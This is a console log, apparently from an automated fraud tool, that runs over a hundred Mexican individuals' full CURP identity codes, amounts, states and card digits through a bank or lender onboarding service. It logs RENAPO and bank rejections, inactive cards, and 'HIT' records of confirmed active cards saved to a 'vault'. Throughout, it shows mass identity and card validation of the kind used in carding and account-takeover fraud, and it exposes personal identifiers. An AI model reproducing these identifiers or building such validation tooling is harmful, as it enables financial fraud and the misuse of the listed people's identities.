[1183] ID:2017786 | LORP701005MYCPDT09 | $189,000 | YUCATAN | T:4659... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:5438 para ID:1143876 ($189,000)... [🔴 OFF] Contacto preexistente (/confirm-contact) (13.0s)
[1184] ID:2018071 | ROSJ690927HNLBRS02 | $189,000 | NUEVO LEON | T:5878... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.3s)
[1185] ID:2056311 | AOFG751027HDFRLL03 | $189,000 | CIUDAD DE ME | T:2992... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.9s)
[1186] ID:2117808 | VARA761228HDFLVG06 | $189,000 | CIUDAD DE ME | T:1729... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))

[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:8714 para ID:1412555 ($189,000)... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (13.6s)
[1187] ID:2236210 | MEZA690529HSPNRR07 | $189,000 | SAN LUIS POT | T:8422... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (12.6s)
[1188] ID:2317274 | GOGA740401HQTMZR05 | $189,000 | QUERETARO | T:0269... [🟢 HIT #6] Tarjeta ACTIVA Confirmada -> Guardado en bóveda!

[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:2992 para ID:2056311 ($189,000)... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (12.0s)
[1189] ID:2385928 | DEAD720913HTSTZV03 | $189,000 | TAMAULIPAS | T:1731... [🔴 OFF] Derivación LikeU Pro (/derivation-pro) (14.2s)
[1190] ID:2769453 | GORA721110HTSNYN08 | $189,000 | TAMAULIPAS | T:3820... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.1s)
[1191] ID:2816286 | MEMJ750105HTCNSR07 | $189,000 | TABASCO | T:7393... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:1729 para ID:2117808 ($189,000)... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (7.1s)
[1192] ID:2841713 | AECT710427MVRSRR03 | $189,000 | VERACRUZ | T:6944... [🔴 OFF] Rechazo bancario (PE040) (14.7s)
[1193] ID:3007646 | EOSG701223MTSSLR07 | $189,000 | TAMAULIPAS | T:6410... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))

[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:0269 para ID:2317274 ($189,000)... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (7.0s)
[1194] ID:3032253 | AUCR770225HYNGNM08 | $189,000 | YUCATAN | T:8973... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Contacto preexistente (/confirm-contact) (21.1s)
[🔴 OFF] Contacto preexistente (/confirm-contact) (15.6s)
[1195] ID:3090897 | VAZA780211HMCRNB08 | $189,000 | ESTADO DE ME | T:8950... [1196] ID:3101100 | REVJ700317HDFYZR07 | $189,000 | CIUDAD DE ME | T:3930... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.5s)
[1197] ID:3204897 | MERM711114MJCNMR00 | $189,000 | JALISCO | T:4999... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.4s)
[1198] ID:3410900 | HEBC701118HBCRRS03 | $189,000 | BAJA CALIFOR | T:6004... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.3s)
[🔴 OFF] Contacto preexistente (/confirm-contact) (13.7s)
[1199] ID:4579050 | PEVS780101HJCRZR06 | $189,000 | JALISCO | T:6993... [1200] ID:4599231 | DISD730411HTLZLV09 | $189,000 | TLAXCALA | T:0246... [🔴 OFF] Rechazo bancario (PE150) (13.5s)
[1201] ID:4650106 | MOPA700608MVRRTM03 | $189,000 | VERACRUZ | T:3711... [🔴 OFF] Contacto preexistente (/confirm-contact) (14.5s)
[1202] ID:4766137 | CARJ720720HDFHBN05 | $189,000 | CIUDAD DE ME | T:1994... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (6.6s)
[1203] ID:3610940 | RAFN700208MSPMLL07 | $188,980 | SAN LUIS POT | T:9032... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.0s)
[1204] ID:2189013 | CUOR700419MBCSRB09 | $188,960 | BAJA CALIFOR | T:3619... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (11.6s)
[1205] ID:37221 | DIBE701227HMCZRF00 | $188,940 | ESTADO DE ME | T:5496... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:1994 para ID:4766137 ($189,000)... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.8s)
[1206] ID:1325127 | DIBE701227HMCZRF00 | $188,940 | ESTADO DE ME | T:6818... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (6.2s)
[1207] ID:1705524 | CACN840506HSPHSX06 | $188,940 | SAN LUIS POT | T:1119... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.2s)
[1208] ID:2314758 | VILJ700509HSPLPN00 | $188,940 | SAN LUIS POT | T:9377... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (9.4s)
[1209] ID:3147597 | VIGE730831HMNLNN04 | $188,900 | MICHOACAN | T:1375... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:1119 para ID:1705524 ($188,940)... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.4s)
[1210] ID:47847 | RORA720815HNLDGR00 | $188,880 | NUEVO LEON | T:0552... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Contacto preexistente (/confirm-contact) (18.6s)
[1211] ID:3905084 | CAIB720820HTCLRR00 | $188,880 | TABASCO | T:7529... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.8s)
[1212] ID:1095272 | AUNF691108HMNGGR08 | $188,830 | MICHOACAN | T:2178... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (20.7s)
[1213] ID:4409934 | CARC701028MCGSML02 | $188,830 | COAHUILA | T:5763... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:0552 para ID:47847 ($188,880)... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.2s)
[1214] ID:1695795 | ROGM760808MCGDRN07 | $188,820 | COAHUILA | T:8561... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (16.5s)
[1215] ID:3061970 | MASR730714MMCRLT04 | $188,810 | ESTADO DE ME | T:9228... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.9s)
[1216] ID:410860 | GAAC730123MMCLRL05 | $188,800 | ESTADO DE ME | T:2400... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))

[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:2178 para ID:1095272 ($188,830)... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.5s)
[1217] ID:4485788 | VAAP720121MJCZLT05 | $188,800 | JALISCO | T:0994... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (6.4s)
[1218] ID:2728901 | CATJ711006HGTHRN08 | $188,790 | GUANAJUATO | T:1131... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (13.2s)
[🔴 OFF] Derivación LikeU Pro (/derivation-pro) (14.4s)
[1219] ID:3751230 | GIUE010101MDFRRLA5 | $188,790 | CIUDAD DE ME | T:3709... [1220] ID:4067519 | EAGL750120MCGSRL07 | $188,790 | COAHUILA | T:8852... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:1131 para ID:2728901 ($188,790)... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.5s)
[1221] ID:944123 | MAMJ761124MGTGNN03 | $188,760 | GUANAJUATO | T:8851... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.5s)
[1222] ID:3290490 | MAGR720816HJCLMC02 | $188,760 | JALISCO | T:2405... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Rechazo bancario (PE1002) (12.1s)
[1223] ID:4172310 | OEBE740102HGTBRZ04 | $188,760 | GUANAJUATO | T:2108... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (21.6s)
[1224] ID:4636141 | JAVR720224HCHCNG02 | $188,760 | CHIHUAHUA | T:8148... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:8851 para ID:944123 ($188,760)... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.4s)
[1225] ID:3723276 | PAPO690120HJCCNS09 | $188,740 | JALISCO | T:9924... [🔴 OFF] Derivación LikeU Pro (/derivation-pro) (14.1s)
[1226] ID:1993335 | VILJ700509HSPLPN00 | $188,660 | SAN LUIS POT | T:6034... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.0s)
[1227] ID:119697 | BOML770113MMCNNS07 | $188,640 | ESTADO DE ME | T:0076... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.9s)
[1228] ID:2684081 | BURD760401MNTSJN06 | $188,610 | NAYARIT | T:9731... [🔴 OFF] Contacto preexistente (/confirm-contact) (13.8s)
[1229] ID:4335499 | VIVR720418HDFLLC04 | $188,610 | CIUDAD DE ME | T:2743... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.1s)
[1230] ID:2112849 | SOGL701231MDFLPL02 | $188,590 | CIUDAD DE ME | T:5648... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.7s)
[1231] ID:964467 | MARA711222MDFRDL01 | $188,510 | CIUDAD DE ME | T:0639... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (15.9s)
[1232] ID:4093623 | SOVJ791213HMCLZV03 | $188,500 | ESTADO DE ME | T:4949... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:2743 para ID:4335499 ($188,610)... [🔴 OFF] Rechazo bancario (PE170) (14.8s)
[1233] ID:2422563 | COMR710715HTSHZD06 | $188,300 | TAMAULIPAS | T:8637... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (6.1s)
[1234] ID:1854079 | ROPM690525MTSCRN03 | $188,290 | TAMAULIPAS | T:4437... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (11.8s)
[🔴 OFF] Rechazo bancario (PE020) (9.9s)
[1235] ID:3176845 | MERM711114MJCNMR00 | $188,240 | JALISCO | T:9737... [1236] ID:169783 | MACJ770624HDFRHC05 | $188,160 | CIUDAD DE ME | T:6654... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:8637 para ID:2422563 ($188,300)... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (10.4s)
[1237] ID:1454872 | UIVI690904MCGRNS03 | $188,160 | COAHUILA | T:3132... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.0s)
[🔴 OFF] Contacto preexistente (/confirm-contact) (15.6s)
[1238] ID:4871121 | VAHC731114HCMLRR03 | $188,130 | COLIMA | T:1717... [1239] ID:1510808 | GOEM720625HCGNSR07 | $188,120 | COAHUILA | T:0915... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.4s)
[1240] ID:2151859 | RICA710811HDFVRL08 | $188,050 | CIUDAD DE ME | T:9451... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.6s)
[1241] ID:324921 | FOLG700902HDFLPR04 | $188,000 | CIUDAD DE ME | T:6665... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.1s)
[1242] ID:365086 | SAAL731208HMNNRS08 | $188,000 | MICHOACAN | T:2573... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.6s)
[1243] ID:449272 | COAR800906HCSRBB03 | $188,000 | CHIAPAS | T:3931... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (16.5s)
[1244] ID:462052 | COHL750317HJCNRS08 | $188,000 | JALISCO | T:9513... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:6665 para ID:324921 ($188,000)... [🔴 OFF] Contacto preexistente (/confirm-contact) (18.4s)
[1245] ID:535274 | SAMO720807HMCNRS00 | $188,000 | ESTADO DE ME | T:1162... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.3s)
[1246] ID:546125 | TAGJ710218HMNLRN00 | $188,000 | MICHOACAN | T:2749... [🔴 OFF] Derivación LikeU Pro (/derivation-pro) (16.4s)
[1247] ID:617395 | AATA700803MBSLRL00 | $188,000 | BAJA CALIFOR | T:5157... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (11.2s)
[1248] ID:641685 | HEDA701130HMNRDR03 | $188,000 | MICHOACAN | T:9850... [🔴 OFF] Contacto preexistente (/confirm-contact) (15.0s)
[1249] ID:642377 | CAHG701217HJCSRS02 | $188,000 | JALISCO | T:4879... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (6.0s)
[1250] ID:717457 | PAPA760208HMCCLL07 | $188,000 | ESTADO DE ME | T:7707... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (15.2s)
[1251] ID:815449 | AALD770128MSONPL06 | $188,000 | SINALOA | T:8822... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:9850 para ID:641685 ($188,000)... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (11.1s)
[1252] ID:1143442 | FEAA710126HMNRCR06 | $188,000 | MICHOACAN | T:4246... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.8s)
[1253] ID:1253161 | VIVJ690624HCPLZN04 | $188,000 | CAMPECHE | T:0845... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (3.9s)
[1254] ID:1371397 | VITP710414HSOLLL06 | $188,000 | SINALOA | T:7577... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.9s)
[1255] ID:1597771 | VICJ730624HYCVSN04 | $188,000 | YUCATAN | T:5660... [🔴 OFF] Rechazo bancario (PE110) (13.3s)
[1256] ID:1720517 | HEDA701130HMNRDR03 | $188,000 | MICHOACAN | T:2549... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.4s)
[1257] ID:1785098 | RURG710512HNLZCR02 | $188,000 | NUEVO LEON | T:2657... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (10.4s)
[1258] ID:2210227 | AECA690204HSOVHN05 | $188,000 | SONORA | T:5269... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:2549 para ID:1720517 ($188,000)... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.0s)
[1259] ID:2361264 | MOMD750205MNLNRS05 | $188,000 | NUEVO LEON | T:6481... [🔴 OFF] Contacto preexistente (/confirm-contact) (15.3s)
[1260] ID:2438742 | LOME751101MDFPRL08 | $188,000 | CIUDAD DE ME | T:1287... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.6s)
[🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[1261] ID:2517299 | GUGM730522MASTRN08 | $188,000 | AGUASCALIENT | T:8808... [🔴 OFF] Rechazo bancario (PE160) (12.3s)
[1262] ID:2633177 | MAMI740825MDFRJR02 | $188,000 | CIUDAD DE ME | T:6009... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (11.8s)
[1263] ID:2711790 | ROMJ730503HBCDNQ02 | $188,000 | BAJA CALIFOR | T:1098... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:8808 para ID:2517299 ($188,000)... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.4s)
[1264] ID:2780589 | MAGC700912HJCRRR06 | $188,000 | JALISCO | T:8749... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (13.0s)
[1265] ID:2900261 | GOEV730329HMCNSC03 | $188,000 | ESTADO DE ME | T:8162... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))

[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:6009 para ID:2633177 ($188,000)... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (6.6s)
[1266] ID:2980715 | BEPJ771103HMCNZL00 | $188,000 | ESTADO DE ME | T:1615... [🔴 OFF] Rechazo bancario (PE160) (11.6s)
[1267] ID:3038729 | CAPJ741112HNLVRV01 | $188,000 | NUEVO LEON | T:8018... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.4s)
[1268] ID:3270977 | SARJ761207HVRNVQ00 | $188,000 | VERACRUZ | T:0698... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.1s)
[1269] ID:3360879 | ZAVN750125HQRPNC05 | $188,000 | QUINTANA ROO | T:6046... [🔴 OFF] Derivación LikeU Pro (/derivation-pro) (13.6s)
[1270] ID:3471582 | MEHV690918HDFDRC02 | $188,000 | CIUDAD DE ME | T:6638... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (6.4s)
[1271] ID:3657922 | RUGF691005HJCVRD08 | $188,000 | JALISCO | T:7846... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (12.4s)
[1272] ID:3696523 | VICL740211HJCLHS09 | $188,000 | JALISCO | T:4493... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:6638 para ID:3471582 ($188,000)... [🔴 OFF] Contacto preexistente (/confirm-contact) (15.6s)
[1273] ID:3813797 | LAMP700114HDFRLB01 | $188,000 | CIUDAD DE ME | T:0156... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (12.5s)
[1274] ID:3819046 | KUUS690316MBCRRN08 | $188,000 | BAJA CALIFOR | T:3425... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:4493 para ID:3696523 ($188,000)... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Rechazo bancario (PE1002) (17.7s)
[1275] ID:3927449 | MATC690328HDFRRR05 | $188,000 | CIUDAD DE ME | T:7032... [🔴 OFF] Derivación LikeU Pro (/derivation-pro) (12.9s)
[1276] ID:3929050 | RAME710823HJCMRD06 | $188,000 | JALISCO | T:2621... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (6.7s)
[1277] ID:4082036 | GURA710326HPLRMR03 | $188,000 | PUEBLA | T:6775... [🔴 OFF] Rechazo bancario (PE1002) (14.3s)
[1278] ID:4158323 | TASD691026HDFWBV02 | $188,000 | CIUDAD DE ME | T:2245... [🔴 OFF] Rechazo bancario (PE110) (14.8s)
[1279] ID:4230334 | LARV730813HCMRMC06 | $188,000 | COLIMA | T:6885... [🔴 OFF] Contacto preexistente (/confirm-contact) (13.7s)
[1280] ID:4271249 | SACE730128HMCNLD06 | $188,000 | ESTADO DE ME | T:6985... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.7s)
[1281] ID:4878775 | RAGA780719MQTNMB09 | $188,000 | QUERETARO | T:5678... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (12.6s)
[1282] ID:4830707 | DAHP710731MGTDRL09 | $187,960 | GUANAJUATO | T:6454... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:6885 para ID:4230334 ($188,000)... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.0s)
[1283] ID:1888203 | LEVO750213HNLLLM07 | $187,930 | NUEVO LEON | T:4553... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.8s)
[1284] ID:2959628 | GACM000101HDFMRNA2 | $187,930 | CIUDAD DE ME | T:4298... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (6.8s)
[1285] ID:183854 | VICR700106HNLLNG05 | $187,920 | NUEVO LEON | T:2935... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.3s)
[1286] ID:3947349 | BASR000101HQTRLCA3 | $187,920 | QUERETARO | T:1702... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (3.9s)
[1287] ID:2044932 | ZUVJ830305HMCNZN09 | $187,880 | ESTADO DE ME | T:3179... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.9s)
[1288] ID:1465677 | VASG711027HMCRNR06 | $187,870 | ESTADO DE ME | T:5975... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.7s)
[1289] ID:2037836 | GAVN721218MDGRDR06 | $187,830 | DURANGO | T:1295... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.9s)
[1290] ID:3794151 | HELR701113MMCRZS09 | $187,810 | ESTADO DE ME | T:1411... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.1s)
[1291] ID:3939221 | NAVD750612HMCVLN07 | $187,810 | ESTADO DE ME | T:9191... [🔴 OFF] Contacto preexistente (/confirm-contact) (12.4s)
[1292] ID:2861049 | MOAA711116MCGLRR04 | $187,770 | COAHUILA | T:6304... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.0s)
[1293] ID:67310 | MUAJ720504HGTNNS05 | $187,760 | GUANAJUATO | T:2122... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.0s)
[1294] ID:108377 | LIGM710425HJCRRR03 | $187,740 | JALISCO | T:3002... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (6.1s)
[1295] ID:2262738 | SIPA690503HCGRCN00 | $187,710 | COAHUILA | T:1725... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.7s)
[1296] ID:777594 | JUGN780528MDFRRR08 | $187,690 | CIUDAD DE ME | T:0529... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.6s)
[1297] ID:1976948 | AAGC700128HDFRMR04 | $187,690 | CIUDAD DE ME | T:6979... [🔴 OFF] Contacto preexistente (/confirm-contact) (14.2s)
[1298] ID:3447318 | PETA731220HDFRRR00 | $187,680 | CIUDAD DE ME | T:0331... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (6.5s)
[1299] ID:1542134 | ROSL700128MSPDLR03 | $187,670 | SAN LUIS POT | T:6118... [🔴 OFF] Derivación LikeU Pro (/derivation-pro) (17.9s)
[1300] ID:3866172 | BAMA010101HDFRMNA3 | $187,650 | CIUDAD DE ME | T:1562... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.4s)
[🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.2s)
[1301] ID:1553757 | MASR690206HVRZNB00 | $187,620 | VERACRUZ | T:9403... [1302] ID:2227541 | SECM740419MTCRNR09 | $187,600 | TABASCO | T:8244... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (3.8s)
[1303] ID:2697447 | BEPJ771103HMCNZL00 | $187,600 | ESTADO DE ME | T:6699... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.3s)
[1304] ID:2470327 | CELT731012MSLRPH03 | $187,590 | LOS MOCHIS | T:5687... [⚠️ RETRY] Timeout global de verificación (22s) (22.0s)
[1305] ID:385710 | HERJ700913HTSRDV01 | $187,500 | TAMAULIPAS | T:7395... [🔴 OFF] Derivación LikeU Pro (/derivation-pro) (15.1s)
[1306] ID:473096 | ROVP730226HDFSLX08 | $187,500 | CIUDAD DE ME | T:2748... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (6.0s)
[1307] ID:632665 | MECS740524MCHNHS06 | $187,500 | CHIHUAHUA | T:2363... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (16.4s)
[1308] ID:788781 | MOCM740617HYCLRR04 | $187,500 | YUCATAN | T:7718... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:7395 para ID:385710 ($187,500)... [🔴 OFF] Derivación LikeU Pro (/derivation-pro) (12.4s)
[1309] ID:972320 | NEMM710707HMCVRG03 | $187,500 | ESTADO DE ME | T:4170... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.4s)
[1310] ID:1431682 | NILD720803HMSLNN00 | $187,500 | MORELOS | T:7156... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.6s)
[1311] ID:1558009 | AUME741226HSOGNF07 | $187,500 | SONORA | T:5360... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.5s)
[1312] ID:2596492 | ROJJ690116HASMSM04 | $187,500 | AGUASCALIENT | T:0352... [🔴 OFF] Contacto preexistente (/confirm-contact) (12.4s)
[1313] ID:3883090 | LOME801005MMNPJR08 | $187,500 | MICHOACAN | T:3564... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.9s)
[1314] ID:4547406 | AASG721128MPLPND02 | $187,500 | PUEBLA | T:2573... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (10.8s)

[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:3564 para ID:3883090 ($187,500)... [1315] ID:4247427 | LAPC720305HMSRDR04 | $187,490 | MORELOS | T:5834... [🔴 OFF] Contacto preexistente (/confirm-contact) (12.8s)
[1316] ID:3779360 | SERP730817HSORDD04 | $187,480 | SINALOA | T:3812... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.6s)
[1317] ID:1006182 | CEEJ690606HMNJLS02 | $187,470 | MICHOACAN | T:9553... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.6s)
[1318] ID:114660 | AACM710513HMCLLG06 | $187,460 | ESTADO DE ME | T:1066... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.4s)
[1319] ID:198381 | TAGA710211HNLMRL04 | $187,460 | NUEVO LEON | T:6032... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Derivación LikeU Pro (/derivation-pro) (13.9s)
[1320] ID:1275024 | VAAG730918HCLLGB08 | $187,460 | COAHUILA | T:3536... [🔴 OFF] Derivación LikeU Pro (/derivation-pro) (15.8s)
[1321] ID:2462433 | LODA780718MMSPZL07 | $187,440 | MORELOS | T:5448... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (6.9s)
[1322] ID:2584248 | RAHS711008HGTYRR05 | $187,440 | GUANAJUATO | T:9572... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.4s)
[1323] ID:3000261 | RODE701024HJCDZD08 | $187,440 | JALISCO | T:9248... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (14.9s)
[1324] ID:4330230 | AERR700818MJCNYT00 | $187,440 | JALISCO | T:4324... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:3536 para ID:1275024 ($187,460)... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Contacto preexistente (/confirm-contact) (14.7s)
[1325] ID:2496388 | ROCE731211MCGSRR02 | $187,400 | COAHUILA | T:0821... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (7.2s)
[1326] ID:2834465 | CAVF710915HJCSLR08 | $187,350 | JALISCO | T:0731... [⚠️ RETRY] Timeout global de verificación (22s) (22.0s)
[1327] ID:3225078 | HERC690316MBCRYR01 | $187,320 | BAJA CALIFOR | T:1301... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (10.7s)
[1328] ID:277054 | FAMG740118MDFDRR07 | $187,300 | CIUDAD DE ME | T:1853... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:0731 para ID:2834465 ($187,350)... [🔴 OFF] Rechazo bancario (PE160) (12.0s)
[1329] ID:775842 | GARA721128HDFRVL07 | $187,260 | CIUDAD DE ME | T:0213... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.5s)
